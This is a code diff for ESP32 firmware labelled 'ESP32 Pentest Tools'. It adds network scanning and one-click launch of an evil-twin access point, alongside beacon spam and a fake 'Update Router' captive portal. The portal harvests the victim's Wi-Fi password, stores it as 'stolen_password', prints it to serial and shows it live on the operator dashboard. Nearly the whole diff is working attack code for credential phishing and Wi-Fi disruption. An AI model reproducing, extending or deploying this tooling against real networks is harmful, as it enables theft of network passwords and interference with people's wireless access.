@@ -15,30 +15,34 @@ const char* dashboard_html = R"rawliteral(
 <style>
 body{font-family:sans-serif;background:#1e1e1e;color:#fff;text-align:center;padding:20px;}
 h1{color:#00ffcc;} .card{background:#2a2a2a;padding:20px;border-radius:10px;max-width:500px;margin:20px auto;}
-input{padding:10px;border-radius:5px;border:none;margin:5px;width:80%;}
-button{padding:10px 20px;border-radius:5px;border:none;cursor:pointer;font-weight:bold;margin:5px;}
+input, select{padding:10px;border-radius:5px;border:none;margin:5px;width:90%;}
+button{padding:12px 20px;border-radius:5px;border:none;cursor:pointer;font-weight:bold;margin:5px;width:95%;}
 .btn-red{background:#ff4444;color:white;} .btn-blue{background:#4444ff;color:white;} .btn-green{background:#44aa44;color:white;}
+.btn-scan{background:#ffaa00;color:black; font-weight: bold;}
 </style></head><body>
 <h1>ESP32 Pentest Tools</h1>
 
 <div class="card">
-    <h3>1. Evil Twin</h3>
-    <input type="text" id="ssid" placeholder="Target SSID">
-    <input type="text" id="bssid" placeholder="BSSID (AA:BB:CC:DD:EE:FF)">
-    <input type="number" id="channel" placeholder="Channel">
-    <br><button class="btn-red" onclick="startEvilTwin()">Start Evil Twin</button>
+    <h3>Auto Evil Twin</h3>
+    <button class="btn-scan" onclick="scanNetworks()">1. Scan Networks</button>
+    <br><br>
+    <select id="target_select">
+        <option value="">-- Select a network --</option>
+    </select>
+    <br><br>
+    <button class="btn-red" onclick="startAutoEvilTwin()">2. Start Evil Twin</button>
 </div>
 
 <div class="card">
-    <h3>2. Beacon Spam</h3>
-    <input type="text" id="spam_name" placeholder="Base Name">
-    <input type="number" id="spam_count" placeholder="Count">
+    <h3>Beacon Spam</h3>
+    <input type="text" id="spam_name" placeholder="Base Name (e.g., Free_WiFi_)">
+    <input type="number" id="spam_count" placeholder="Count (e.g., 50)">
     <br><button class="btn-blue" onclick="startSpam()">Start Spam</button>
 </div>
 
 <div class="card">
-    <h3>3. Stop All</h3>
-    <button class="btn-green" onclick="stopAll()">Stop</button>
+    <h3>Stop All</h3>
+    <button class="btn-green" onclick="stopAll()">Stop & Reset</button>
 </div>
 
 <div class="card">
@@ -47,8 +51,23 @@ button{padding:10px 20px;border-radius:5px;border:none;cursor:pointer;font-weigh
 </div>
 
 <script>
-function startEvilTwin() { let ssid = document.getElementById('ssid').value; let bssid = document.getElementById('bssid').value; let ch = document.getElementById('channel').value; fetch('/start_eviltwin?ssid='+ssid+'&bssid='+bssid+'&ch='+ch); }
-function startSpam() { let name = document.getElementById('spam_name').value; let count = document.getElementById('spam_count').value; fetch('/start_spam?name='+name+'&count='+count); }
+function scanNetworks() {
+    document.getElementById('target_select').innerHTML = '<option>Scanning... wait 5s</option>';
+    fetch('/scan').then(r=>r.text()).then(t=>{
+        document.getElementById('target_select').innerHTML = t;
+    });
+}
+function startAutoEvilTwin() {
+    let val = document.getElementById('target_select').value;
+    if(!val) { alert("Please scan and select a network first!"); return; }
+    fetch('/start_auto_eviltwin?data=' + encodeURIComponent(val));
+    alert("Evil Twin Started!");
+}
+function startSpam() {
+    let name = document.getElementById('spam_name').value;
+    let count = document.getElementById('spam_count').value;
+    fetch('/start_spam?name='+name+'&count='+count);
+}
 function stopAll() { fetch('/stop'); }
 setInterval(()=>{ fetch('/get_pass').then(r=>r.text()).then(t=>document.getElementById('stolen_pass').innerText=t); }, 2000);
 </script></body></html>
@@ -74,44 +93,71 @@ button{background:#1a56db;color:white;padding:12px 20px;border:none;border-radiu
         <button type="submit">Update Router</button>
     </form>
 </div>
-<script>
-let p=0; setInterval(()=>{ if(p<100){p+=5; document.getElementById('bar').style.width=p+'%';} },500);
-</script></body></html>
+<script>let p=0; setInterval(()=>{ if(p<100){p+=5; document.getElementById('bar').style.width=p+'%';} },500);</script></body></html>
 )rawliteral";
 
 void handleRoot() { server.send(200, "text/html", dashboard_html); }
 void handlePortal() { server.send(200, "text/html", portal_html); }
 
+void handleScan() {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(100);
+    
+    int n = WiFi.scanNetworks();
+    String options = "";
+    for (int i = 0; i < n; ++i) {
+        String ssid = WiFi.SSID(i);
+        int ch = WiFi.channel(i);
+        String bssid = WiFi.BSSIDstr(i);
+        if(ssid.length() > 0) {
+            String value = bssid + "," + ssid + "," + String(ch);
+            options += "<option value='" + value + "'>" + ssid + " (" + bssid + ")</option>";
+        }
+    }
+    if(options == "") options = "<option value=''>No networks found</option>";
+    
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("Free_WiFi_Update", "");
+    
+    server.send(200, "text/html", options);
+}
+
+void handleAutoEvilTwin() {
+    if (server.hasArg("data")) {
+        String data = server.arg("data");
+        int c1 = data.indexOf(',');
+        int c2 = data.indexOf(',', c1 + 1);
+        
+        if (c1 > 0 && c2 > 0) {
+            String bssidStr = data.substring(0, c1);
+            String ssid = data.substring(c1 + 1, c2);
+            int ch = data.substring(c2 + 1).toInt();
+            
+            uint8_t bssid[6];
+            sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+            
+            startEvilTwin(ssid, bssid, ch);
+            attack_active = true;
+            server.send(200, "text/plain", "Started");
+            return;
+        }
+    }
+    server.send(400, "text/plain", "Error");
+}
+
 void handleSubmitPassword() {
     if (server.hasArg("password")) {
         stolen_password = server.arg("password");
-        Serial.print("Stolen Password: ");
-        Serial.println(stolen_password);
+        Serial.println("Pass: " + stolen_password);
     }
     server.send(200, "text/html", "<h1>Thank you! Router Updated.</h1>");
 }
 
-void handleStartEvilTwin() {
-    if (server.hasArg("ssid") && server.hasArg("bssid") && server.hasArg("ch")) {
-        String ssid = server.arg("ssid");
-        String bssidStr = server.arg("bssid");
-        int ch = server.arg("ch").toInt();
-        uint8_t bssid[6];
-        sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
-        startEvilTwin(ssid, bssid, ch);
-        attack_active = true;
-        server.send(200, "text/plain", "Evil Twin Started");
-    } else {
-        server.send(400, "text/plain", "Missing Parameters");
-    }
-}
-
 void handleStartSpam() {
     if (server.hasArg("name") && server.hasArg("count")) {
-        String name = server.arg("name");
-        int count = server.arg("count").toInt();
-        startBeaconSpam(name, count);
-        server.send(200, "text/plain", "Beacon Spam Started");
+        startBeaconSpam(server.arg("name"), server.arg("count").toInt());
+        server.send(200, "text/plain", "Spam Started");
     } else {
         server.send(400, "text/plain", "Missing Parameters");
     }
@@ -120,12 +166,10 @@ void handleStartSpam() {
 void handleStop() {
     stopAllAttacks();
     attack_active = false;
-    server.send(200, "text/plain", "All Attacks Stopped");
+    server.send(200, "text/plain", "Stopped");
 }
 
-void handleGetPass() {
-    server.send(200, "text/plain", stolen_password);
-}
+void handleGetPass() { server.send(200, "text/plain", stolen_password); }
 
 void handleNotFound() {
     if (attack_active) {
@@ -141,13 +185,13 @@ void initWebServer() {
     server.on("/", handleRoot);
     server.on("/portal", handlePortal);
     server.on("/submit_password", handleSubmitPassword);
-    server.on("/start_eviltwin", handleStartEvilTwin);
+    server.on("/scan", handleScan);
+    server.on("/start_auto_eviltwin", handleAutoEvilTwin);
     server.on("/start_spam", handleStartSpam);
     server.on("/stop", handleStop);
-    server.on("/get_pass", handleGetPass); // مسار جديد لجلب كلمة المرور
+    server.on("/get_pass", handleGetPass);
     server.onNotFound(handleNotFound);
     server.begin();
-    Serial.println("Web Server Started");
 }
 
 void handleWebServer() {
